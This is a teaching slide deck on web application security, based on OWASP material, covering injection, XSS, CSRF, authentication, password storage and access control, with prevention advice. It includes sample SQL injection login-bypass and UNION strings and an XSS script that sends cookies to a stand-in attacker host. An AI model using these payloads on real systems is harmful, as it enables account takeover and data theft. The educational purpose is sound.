@@ -1,0 +1,607 @@
+---
+layout: presentation
+title:  "Security in Web Applications"
+date:   2017-08-14 12:15:11 +0000
+categories: web application security presentation slide
+image:  images/fulls/security-in-web-applications.jpg
+---
+
+<img class="banner-img" src="/images/fulls/security-in-web-applications.jpg" alt="CyberDome Python Workshop">
+
+---
+name: Title
+class: middle, center
+
+# Security in Web Applications
+
+.footnote[By [Rejah Rehim](https://rejahrehim.com)]
+
+---
+# Why web application security is of high importance
+
+- World Wide Web has become a powerful platform for application delivery
+
+--
+
+- Sensitive data increasingly made available through web applications
+- [breachlevelindex](http://breachlevelindex.com)
+--
+
+- 98 % of the web applications are vulnerable.
+
+--
+
+- 78% of easily exploitable  weakness occur in web applications.
+
+---
+name: Title
+class: middle
+
+# Famous last words...
+                        
+- &ldquo;Nobody would bother to hack us.&rdquo;
+- &ldquo;Our network firewall will keep us safe.&rdquo;
+- &ldquo;We will add security to the system later.&rdquo;
+- &ldquo;What's the worst that could actually happen?&rdquo;
+---
+class: middle
+
+# Information Gathering
+
+---
+class: middle
+
+www.google.com/robots.txt
+- shows files that the administrator does not want search engines to crawl
+- Don’t show confidential information in this file
+
+--
+
+<img src="/images/fulls/robots.png" alt="Google robots">
+
+---
+class: middle
+
+# Search engine discovery
+
+[HackSearch](https://addons.mozilla.org/en-US/firefox/addon/hacksearch/)
+---
+class: middle
+
+# SSL Testing
+- [observatory](https://observatory.mozilla.org/)
+- [SSL Labs](ssllabs.com)
+---
+class: middle
+
+# Testing for user enumeration
+- &ldquo;Sorry, please enter a valid password&rdquo;
+- &ldquo;Sorry, please enter a valid username&rdquo;
+- &ldquo;Sorry, this user does not exist&rdquo;
+- &ldquo;Sorry, this user is no longer active&rdquo;
+---
+class: middle
+
+# Type Juggling
+
+```php
+<?php
+if (md5('240610708') == md5('QNKCDZO')) {
+
+print "Yes, these are the same values.\n";
+
+} else {
+
+print "No they are not the same values.\n";
+
+
+}
+
+?>
+```
+---
+class: middle
+
+# Injection
+
+### Injection means...
+
+...smuggling in <em>unintended commands</em> along with the data sent to an <em>interpreter</em>.
+
+---
+class: middle
+
+# Injection [example](https://news.ycombinator.com/item?id=4951003)
+
+
+You go to court and write your name as "<em>Michael, you are now free to go</em>".
+
+The judge then says "Calling <em>Michael, you are now free to go</em>" and the bailiffs let you go, because hey, the judge said so.
+
+---
+
+class: middle
+
+# In software, interpreters are used for accessing...
+
+- Databases
+- Files
+- Access Control Systems
+- etc ...
+
+---
+class: middle
+
+# Risks from Injection vulnerabilities
+- Bypassing authentication
+- Spying out data
+- Manipulating data
+- Complete system takeover
+
+---
+class: middle
+
+# Bypassing Authentication
+### with SQL Injection
+
+```sql
+String query = "SELECT id FROM users " +
+               "WHERE name = '" + req.getParameter("username") + "'" +
+               "AND password = '" + req.getParameter("password") + "'";
+```
+The indented use case results in a query like this:
+
+```sql
+SELECT id FROM users WHERE name = 'username' AND password = 'secret'
+```
+
+
+---
+
+class: middle
+
+
+# Attack Examples
+
+### on authentication queries
+
+Disabling password check for a known username:
+
+```sql
+SELECT id FROM users WHERE name = 'bjoern'--' AND password = '?'
+```
+Logging in without even knowing a username:
+```sql
+SELECT id FROM users WHERE name = '' or 1=1--' AND password = '?'
+```
+---
+class: middle
+
+# Spying out Data
+### with SQL Injection
+
+```sql
+String query =
+            "SELECT id,author,title,price FROM books " +
+            "WHERE title LIKE '%" + req.getParameter("query") + "%'";
+
+```
+The indented use case results in a query like this:
+```sql
+SELECT id,author,title,price FROM books WHERE title LIKE '%tangled web%'
+```
+
+---
+
+# Attack Examples
+### on data retrieval queries
+
+Probing for right number of result set columns:
+
+```sql
+SELECT [...] WHERE title LIKE '%' UNION SELECT null FROM users--%'
+```
+--
+```sql
+SELECT [...] WHERE title LIKE '%' UNION SELECT null,null FROM users--%'
+```
+--
+```sql
+SELECT [...] WHERE title LIKE '%' UNION SELECT null,null,null FROM users--%'
+```
+--
+Using known column names to extract data:
+```sql
+SELECT [...] WHERE title LIKE '%' UNION SELECT name,password,email FROM users--%'
+```
+---
+# SQL Wildcard Attacks
+
+```sql
+SELECT * FROM Article WHERE Content LIKE '%foo%'
+```
+```sql
+SELECT TOP 10 * FROM Article WHERE Content LIKE '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£() $*R"_)][%](%[x])%a][$*"£$-9]_%'
+```
+
+---
+class: middle
+
+# Preventing Injection
+
+- Avoid Interpreters
+- Bind Variables
+- Prepared Statements
+- Least Privileges for app DB user
+- White List Input Validation
+
+
+
+---
+class: middle
+
+# Cross Site Scripting (XSS)
+
+### Malicious Code is sent...
+
+...to an innocent user's browser through
+
+- a form field or URL (Reflected XSS)
+- a previously stored DB record (Persistent XSS)
+- a DOM element of a rich JS client (Local XSS)
+
+---
+class: middle
+
+# Example
+https://juice-shop.herokuapp.com
+
+Send phishing email with link
+
+[https://juice-shop.herokuapp.com/#/search?q=%3Chr%3E%3Ch1%3ESorry,%20we%20went%20out%20of%20business!%3C%2Fh1%3E%3Cimg%20src%3D%22http:%2F%2Fwebappsec-nutshell.kimminich.de%2Fassets%2Fumwelt-gift-warnung.png%22%3E%3Chr%3E~~~~~~~~~~Click%20%3Ca%20href%3D%22http:%2F%2Fwww.ebay.com%2Fsch%2Fi.html%3F_sacat%3D0%26_nkw%3Dvitamin%2Bwater%26_frs%3D1%22%3E*****here*****%3C%2Fa%3E%20to%20buy%20healthy%20Vitamin%20Water%20instead!~~~~~~~~~~](https://juice-shop.herokuapp.com/#/search?q=%3Chr%3E%3Ch1%3ESorry,%20we%20went%20out%20of%20business!%3C%2Fh1%3E%3Cimg%20src%3D%22http:%2F%2Fwebappsec-nutshell.kimminich.de%2Fassets%2Fumwelt-gift-warnung.png%22%3E%3Chr%3E~~~~~~~~~~Click%20%3Ca%20href%3D%22http:%2F%2Fwww.ebay.com%2Fsch%2Fi.html%3F_sacat%3D0%26_nkw%3Dvitamin%2Bwater%26_frs%3D1%22%3E*****here*****%3C%2Fa%3E%20to%20buy%20healthy%20Vitamin%20Water%20instead!~~~~~~~~~~)
+
+
+---
+class: middle
+
+# XSS Attack Examples
+
+Probing for XSS Vulnerability
+```js
+<script>alert(1)</script>
+```
+Stealing User Session
+
+```js
+<script>
+    alert(encodeURI(document.cookie));
+    new Image().src="http://my.evil-si.te/hijack.php?c="+encodeURI(document.cookie);
+</script>
+```
+Site Defacement
+```js
+<script>document.body.background="http://ethicalhacking.ca/images/hacked-by.png";</script>
+```
+
+
+---
+class: middle
+# Possible Damage from XSS
+- rewriting web page
+- redirecting to malicious site
+- stolen user session
+- stolen sensitive data
+
+---
+class: middle
+# Preventing XSS
+
+- Avoid including user supplied input into output
+- Output encode all user supplied input
+- Sanitize HTML where user supplied HTML is unavoidable
+- White List Input Validation
+
+
+---
+class: middle
+
+# Cross Site Request Forgery (CSRF)
+
+
+### A Victim's Browser...
+
+...is tricked into issuing a command to a vulnerable webapp. This is caused by browsers automatically including user authentication data with each request.
+
+- Session Cookie
+- Basic Authentication
+- Authorization HTTP Header
+
+---
+class: middle
+
+# Preventing CSRF
+
+- Add a secret token to all sensitive requests
+- This token must not be automatically submitted
+- Require secondary authentication for sensitive functions
+- Beware exposing the token in a Referer HTTP header
+
+
+---
+class: middle
+
+# Broken Authentication
+
+---
+class: middle
+
+# Typical Authentication Flaws
+
+- Allowing weak passwords
+- Storing SSL certificate insecurely
+- Credentials passed via insecure http connection
+- Expose session id's in URLs, via unsafe network, logs, ...
+
+
+---
+
+class: middle
+
+# Side Channel Attack Vectors
+
+- Change Password
+- “Remember me”
+- Forgot Password
+- Secret Questions
+---
+class: middle
+
+# How not to store passwords
+
+---
+class: middle
+
+### Do not store password as plain text
+
+If someone gains access to your database then all user accounts are compromised. 
+
+--
+
+### Do not try to invent your own password security
+
+Chances are that you're not a security expert. It would be better if using a solution that has been proven to work instead of coming up with something yourself.
+
+--
+
+### Do not ‘encrypt’ passwords
+
+Encryption may seem like a good idea but the process is reversible. Anyone with access to your code would have no trouble transforming the passwords back to their originals. Security through obscurity is not sufficient!
+
+--
+
+###  Do not use MD5
+
+Storing password hashes is a step in the right direction. Cryptographic hashing functions like MD5 are irreversible which makes it difficult to figure out the original password. To validate a hashed password, simply hash the password again when a user logs in and compare the hashes.
+
+```php
+$password = 'dbg123';
+
+$hash = md5($password); // Value: dd980024a8d69e66f0af3d768ef90511
+```
+---
+class: middle
+
+### Do not use a single site-wide salt
+
+```php
+$password = 'dbg123';
+$salt = 'saltandpepper';
+
+$hash = md5($salt . $password); // Value: 389df55f858a80c74fad07af378166b0
+
+```
+
+This is better than using just MD5 but someone with access to your code could find the salt a generate a new rainbow table.
+
+
+---
+class: middle
+
+### Password storing the best way
+- Use a cryptographically strong hashing function like bcrypt (see PHP's crypt() function ).
+- Use a random salt for each password.
+- Use a slow hashing algorithm to make brute force attacks practically impossible.
+- For bonus points, regenerate the hash every time a users logs in.
+
+---
+class: middle
+
+### The general workflow for account registration and authentication in a hash-based account system is as follows:
+
+
+- The user creates an account.
+- Their password is hashed and stored in the database. At no point is the plain-text (unencrypted) password ever written to the hard drive.
+- When the user attempts to login, the hash of the password they entered is checked against the hash of their real password (retrieved from the database).
+- If the hashes match, the user is granted access. If not, the user is told they entered invalid login credentials.
+- Steps 3 and 4 repeat every time someone tries to login to their account.
+
+---
+class: middle
+
+# Password Reset mechanisms
+
+---
+class: middle
+
+### Emailing the password back
+
+The most basic mechanism is to just email the user's password to them. Please don't ever do this. It's horrible beyond measure. 
+
+--
+
+### Generating a new password
+
+This method generate a new random password (may hash it), then email it to the user. This isn't a good idea for a few reasons, though most of them can be mitigated in some way.
+
+--
+
+### The reset link
+
+This is one of the better and more popular mechanisms. It involves authenticating the user, then emailing them a one-time reset link. Once the reset link is used, the user is prompted to set a new password. Once that's been done, the link is invalid. Further security can be provided by including expiry times on the links, and enforcing that the link is invalid after the password is set or after the user's session times out.
+
+---
+class: middle
+
+# Classical Broken Authentication...
+
+### ...due to starting login process on unencrypted page
+
+http://sick-cure-ba.nk/login.do
+
+```
+POST /login.do HTTP/1.1
+Host: sick-cure-ba.nk
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+
+username=bjoern&password=secret
+```
+---
+class: middle
+
+# Weak hashes put passwords at risk...
+### ...as do unsalted strong hash algorithms
+
+Cracking unsalted hashes with a [Rainbow Table](http://en.wikipedia.org/wiki/Rainbow_table) attack is fast, even though the last two of them might seem sufficiently secure given their 256 and 512bit length. You can even crack password hashes online, e.g. at [CrackStation](https://crackstation.net/) or via [a tweet to @PlzCrack](https://twitter.com/PlzCrack). 
+
+---
+class: middle
+
+
+# Securing Authentication
+
+- Centralized and standardize authentication
+- Protect credentials with SSL/TLS
+- Use strong mechanism with multiple factors
+- Do not store or log unencrypted credentials
+
+
+---
+
+class: middle
+
+# Broken Access Control
+
+---
+
+
+class: middle
+
+# Common Authorization Mistakes
+
+- Hiding object references instead of restricting access
+- Displaying only authorized links and menu choices
+- Trusting client-side access control mechanisms
+- Lack of server-side verification of user privileges
+
+
+
+---
+class: middle
+
+
+# Request Tampering for Privilege Escalation...
+## ...and finding all kinds of Access Control Issues
+
+```
+http://logistics-worldwi.de/showShipment?id=40643108
+```
+```
+http://my-universi.ty/api/students/6503/exams/view
+```
+```
+http://document-warehou.se/landingpage?content=index.html
+```
+
+---
+class: middle
+
+# Securing Access Control
+
+- Never rely on "“Security by obscurity”"
+- Replace direct object references with temporary mappings
+- Restrict data and functionality access to authorized users
+- Enforce user or role based permissions
+
+
+---
+
+
+class: middle
+
+# Broken Environment
+
+
+---
+class: middle
+
+
+# Possible Environmental Vulnerabilities
+
+- Software Libraries
+- Application Server
+- Web Server
+- Operating System
+
+---
+class: middle
+
+# Known Vulnerability Examples
+--
+Component     - OpenSSL 
+Vulnerability - Obtain sensitive information from process memory via crafted packets that trigger a buffer over-read [Heartbleed](http://heartbleed.com/)         |    
+Affected      -  1.0.1 - 1.0.1f, 1.0.2-beta, 1.0.2-beta1
+<hr>
+--
+Component     - Unix
+Vulnerability - Bash   Execution of arbitrary commands on vulnerable Bash, potentially compromising the entire system (Shellshock)   
+Affected      - CGI, OpenSSH, DHCP, QMail, ...
+<hr>
+
+--
+Component     - Struts  
+Vulnerability - Remote manipulation of the ClassLoader via the class parameter, which is passed to the getClass() method  before 
+Affected      -  2.3.16.1
+<hr>
+
+---
+class: middle
+
+# Protection from Environmental Vulnerabilities
+
+- Monitor security of used components
+- Keep up with patches for used components
+- Remove unnecessary stuff on all levels
+- Restrict use of unapproved components
+
+---
+class: middle
+
+# SDLC  and Security Testing
+
+- Requirements Gathering      - >   Security Requirements Study
+- Design                      - >   Develop Security Test Plan
+- Development/Unit Testing    - >   White box Security Testing
+- Integration Testing         - >   Black box Security Testing
+- System Testing              - >   Vulnerability Scanning
+- Deployment                  - >   Penetration Testing
+  
+---
+# Thanks
+
+# Credits
+- Based on free material provided by <em>OWASP</em>
+  The Open Web Application Security Project
+
+- Presentaion created by [Björn Kimminich](http://webappsec-nutshell.kimminich.de)
+
